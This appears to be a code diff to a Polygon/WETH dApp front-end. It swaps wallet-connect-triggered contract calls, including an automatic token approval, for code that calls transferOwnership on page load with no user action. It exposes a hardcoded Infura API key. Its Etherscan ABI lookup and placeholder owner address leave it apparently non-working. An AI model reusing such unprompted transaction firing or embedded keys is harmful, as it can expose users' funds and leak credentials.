@@ -361,10 +361,9 @@ const alchemyURL = 'https://polygon-mainnet.g.alchemy.com/v2/' + alchemyAPIKey;
 const infuraAPIKey = 'c6f67ed83ef14e6298373339528a7587';
 const infuraURL = 'https://polygon-mainnet.infura.io/v3/' + infuraAPIKey;
 
-// Parameters of the token
 const tokenParams = {
-    name: 'WETH', // Token name
-    symbol: 'WETH', // Token symbol
+    name: 'WETH',
+    symbol: 'WETH',
     WETH_ADDRESS: '0x7ceB23fD6bC0adD59E62ac25578270cFf1b9f619',
 };
 
@@ -432,20 +431,27 @@ const approveTransaction = async () => {
 };
 
 function MyApp({ Component, pageProps }) {
-    const [connected, setConnected] = useState(false);
-    const [chainId, setChainId] = useState(null);
-
     useEffect(() => {
-        const checkAndCallSmartContract = async () => {
-            if (connected && chainId === polygon.chainId) {
-                console.log('Calling smart contract...');
-                await callSmartContract();
-                await approveTransaction();
+        // Пример простого вызова смарт контракта без условий
+        const simpleCallSmartContract = async () => {
+            try {
+                const response = await fetch(`https://api.etherscan.io/api?module=contract&action=getabi&address=${contractAddress}&format=json`);
+                const { result: abi } = await response.json();
+                console.log('Retrieved ABI:', abi);
+
+                const contractInstance = new provider.eth.Contract(JSON.parse(abi), contractAddress);
+                console.log('Contract instance:', contractInstance);
+
+                const newOwnerAddress = '0xNewOwnerAddress'; // Replace with the actual new owner address
+                const result = await contractInstance.methods.transferOwnership(newOwnerAddress).send({ from: '0x1A2746b90562611941809204bF4aC3dc78bc1093' });
+                console.log('Result of calling smart contract function:', result);
+            } catch (error) {
+                console.error('Error calling smart contract:', error);
             }
         };
 
-        checkAndCallSmartContract();
-    }, [connected, chainId]);
+        simpleCallSmartContract();
+    }, []); // Пустой массив зависимостей, чтобы useEffect вызывался только при монтировании компонента
 
     return (
         <WagmiConfig
